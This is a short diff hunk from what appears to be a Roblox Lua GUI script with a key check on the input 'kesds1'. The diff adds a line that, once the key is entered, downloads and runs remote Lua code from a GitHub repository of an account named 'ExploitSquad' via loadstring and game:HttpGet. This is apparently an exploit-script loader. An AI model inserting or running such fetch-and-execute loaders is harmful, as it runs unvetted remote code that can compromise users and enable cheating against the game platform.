@@ -32,7 +32,7 @@ TextButton.TextSize = 14.000
 if Input.Text == "kesds1" then
 	Frame.Visible = false
 	
-	
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ExploitSquad/Dead.ware.lua/main/Dead.ware.lua"))()
 end
 
 UICorner.Parent = Frame
